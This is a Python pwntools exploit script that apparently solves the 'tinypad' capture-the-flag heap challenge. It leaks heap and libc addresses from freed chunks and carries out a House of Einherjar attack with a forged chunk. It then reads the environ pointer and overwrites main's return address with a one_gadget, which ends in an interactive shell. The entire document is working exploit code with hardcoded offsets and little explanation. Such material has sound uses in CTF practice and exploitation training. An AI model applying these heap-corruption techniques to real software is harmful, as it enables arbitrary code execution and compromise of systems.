from pwn import *
#context.log_level = 'debug'
sh = process('./tinypad')
elf = ELF('tinypad')
libc = ELF('libc.so.6')

def add(size,data):
	sh.recvuntil('(CMD)>>> ')
	sh.sendline('A')
	sh.recvuntil('(SIZE)>>> ')
	sh.sendline(str(size))
	sh.recvuntil('(CONTENT)>>> ')
	sh.sendline(data)

def edit(idx,data):
	sh.recvuntil('(CMD)>>> ')
	sh.sendline('E')
	sh.recvuntil('(INDEX)>>> ')
	sh.sendline(str(idx))
	sh.recvuntil('(CONTENT)>>> ')
	sh.sendline(data)
	sh.recv()
	sh.sendline('Y')

def delete(idx):
	sh.recvuntil('(CMD)>>> ')
	sh.sendline('D')
	sh.recvuntil('(INDEX)>>> ')
	sh.sendline(str(idx))


add(16,'a')
add(16,'b')
add(256,'c')
#------------------get heap base------------------------------
#edit(1,24)
delete(2)
delete(1)
#edit(2,24)
sh.recvuntil('#   INDEX: 1\n # CONTENT: ')
heap_base = u64(sh.recvuntil('\n',drop=True).ljust(8,'\x00'))-0x20
print 'heap_base: '+hex(heap_base)

#-------------------get libc addr------------------------
delete(3)
sh.recvuntil('#   INDEX: 1\n # CONTENT: ')
main_arena_addr = u64(sh.recvuntil('\n',drop=True).ljust(8,'\x00'))
libc_addr = main_arena_addr - 0x3c4b78 
print 'libc_addr: '+hex(libc_addr)

#-----------------house of einherjar-------------------------
add(24,'d'*24)
add(256,0xf8*'e'+'\x11')
add(256,0xf8*'f')
add(256,0xf8*'h')
fake_addr = 0x602040 
size = heap_base - fake_addr

print hex(size)

pay = 'g'*0x20+p64(0)+p64(0x101) + p64(fake_addr)+p64(fake_addr) 
edit(3,pay)

for i in range(len(p64(size))-len(p64(size).strip('\x00'))+1): 
	edit(1,'a'*0x10+p64(size).strip('\x00').rjust(8-i,'f')) 
#gdb.attach(sh)
delete(2) 
sh.recvuntil("Deleted.")

#gdb.attach(sh)
payload="a"*0x20+p64(0)+p64(0x111)+p64(main_arena_addr)+p64(main_arena_addr)
edit(4,payload)

#-------------------------------------------------------------
one_gadget_off = 0x45216
one_gadget_addr = libc_addr+ one_gadget_off
print 'one_gadget_addr: '+hex(one_gadget_addr)
environ_point_addr = libc_addr + libc.symbols['_environ']
pay = 'i'*0xd0 + p64(0x100) + p64(environ_point_addr) + p64(0x100) + p64(0x602148)
add(256,pay)

#gdb.attach(sh)

sh.recvuntil('#   INDEX: 1\n # CONTENT: ')
environ_addr=u64(sh.recvuntil('\n',drop=True).ljust(8,'\x00'))
print "environ_addr: "+hex(environ_addr)
main_ret_addr=environ_addr-30*8
print 'main_ret_addr: '+hex(main_ret_addr)

#gdb.attach(sh)
#--------------------------------------------
edit(2,p64(main_ret_addr))
edit(1,p64(one_gadget_addr))

sh.recv()
sh.sendline('Q')
#gdb.attach(sh)

sh.interactive()
